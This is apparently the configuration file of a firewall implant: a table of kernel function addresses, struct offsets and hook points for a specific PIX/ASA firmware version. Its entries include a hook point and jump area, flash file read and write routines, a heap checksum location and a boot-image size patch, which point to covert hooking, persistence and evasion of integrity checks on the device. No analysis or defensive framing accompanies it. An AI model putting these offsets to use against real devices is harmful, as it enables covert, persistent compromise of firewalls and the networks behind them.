; --- SECTION I ---
;
0x40080200            // pix version
0x1b14000             // address of implant configuration
0x0   0x0892f690      // allocb
0x1   0x0892de70      // freeb
0x2   0x08061030      // open (7.0(+) this is an array for Channel Stuff)
0x3   0x08460350      // ip_put
0x4   0x08061190      // close
0x5   0x0908c920      // atoip
0x6   0x090bbc0c      // memset
0x7   0x090a33c0      // memmove
0x8   0x0892dce0      // malloc_call_calloc
0x9   0x090a2e40      // free
0xa   0x08060940      // kprintf
0xb   0x00000014      // interface offset in metaframe
0xc   0x00000010      // offset for vlan number in interface struct
0xd   0x0000005c      // metaframe offset in block structure
0xe   0x00000078      // interface semiphore in metaframe
0xf   0x090a4510      // rand
0x15  0x0805f4b0      // process_create
0x16  0x0805ee60      // process_suspend
0x17  0x0805e690      // process_sleep_for
0x18  0x0877d400      // show_process
0x19  0x0000001c      // offset to security level in int_struct
0x1a  0x099a9e20      // cur_t
0x1b  0x04            // channel offset in interface struct
0x1c  0x0c            // PUT offset in channel struct
0x1d  0x24            // offset to dest mac in arp structure
0x1e  0x10            // offset to next hop ip in route structure
0x1f  0x20            // size of route struct
0x20  0x08463430      // calc_ip_cksum
0x21  0x084643c0      // arp_loopkup
0x22  0x08462890      // set_block_hdr_mac_and_proto
0x23  0x08473e60      // get hardware interface
0x24  0x086fb020      // get next hop
0x25  0x086fb2c0      // get route
0x26  0x0845e2f0      // send_it
0x27  0x08466160      // arp_create
0x28  0x087d6620      // get_hw_iface_2
0x2a  0x3c            // pointer to ethernet frame
0x2b  0x34            // wptr structure offset
0x2c  0x1c            // inIfc (incoming interface) structure offset
0x2e  0x000001a4      // offset from cur_t that contains the current context number
0x2f  0x098c7fa0      // pointer to channnel list
0x30  0x095e1850      // address of NIC database
0x31  0x00000014      // offset to vlan struct in metaframe (interface offset)
0x32  0x00000020      // offset to IP address in int_struct
0x33  0x00000018      // iface struct adjust from metaframe
0x34  0x098d34f4      // max number of interface cards
0x35  0x099aa5c0      // internal_clock
0x36  0x087d40e0      // get_interface_mac
0x37  0x0000014b      // offset to hardware interface number in interface struct
0x38  0x10            // offset to ip in route structure
0x39  0x00            // offset to interface num in route structure
0x3a  0x00000420      // offset to send channel in channel list
0x3b  0x083bd0a0      // ifs_read; flash file read routine -- IFS: Read:
0x3c  0x083bd180      // ifs_write; flash file write routine -- IFS: Write:
0x3d  0x083bc6e0      // ifs_open; flash file open routine -- IFS: Opened: 
0x3e  0x083bcfc0      // ifs_close; flash file close routine -- IFS: Close: 
0x3f  0x00000018      // offset to next IP fragment pointer in block
0x40  0x099c2f80      // address of context list
0x42  0x090ba450      // checkheaps checksum location
0x43  0x084521d0      // get booted image's filename
0x44  0x08325f9f      // fix image size hook point
0x45  0x01848b80      // clean image file size
0x46  0xffffffff      // asa fix image size hook point
0x47  0x2c            // offset to filesize in file info struct
0x52  0x08492390      // ipv6_encap
;
; --- END OF SECTION I ---
;
:EOS:
;
; --- SECTION II ---
;
HookLocation              0x085f90e7      // address of our hook point
HookedCall                0x085fc6b0      // called function being hooked
JmpLocation               0x08fa9202      // empty area to jump to
InterfaceAddr             0x095e1850      // same as 0x30 above
InterfaceLeng             0x000001c0      // length of interface struct
IntSecurityOffset         0x1c            // security level field offset
IntNameOffset             0x00000190      // interface name field offset
IntNumOffset              0x0000014b      // interface number field offset
IntVlanOffset             0x10            // same as 0xc above
IntIPOffset               0x20            // ip address offset in the interface struct
IntNetmaskOffset          0x24            // netmask in the iface struct
